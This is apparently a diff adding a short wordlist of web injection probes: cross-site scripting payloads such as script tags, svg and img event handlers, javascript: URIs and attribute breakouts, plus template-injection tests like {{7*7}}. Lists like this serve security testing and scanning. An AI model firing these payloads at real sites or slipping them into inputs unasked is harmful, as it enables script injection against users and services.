@@ -1,0 +1,12 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+javascript:alert(1)
+"onmouseover="alert(1)
+</title><script>alert(1)</script>
+{{7*7}}
+${7*7}
+<iframe src=javascript:alert(1)>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+<body onload=alert(1)>
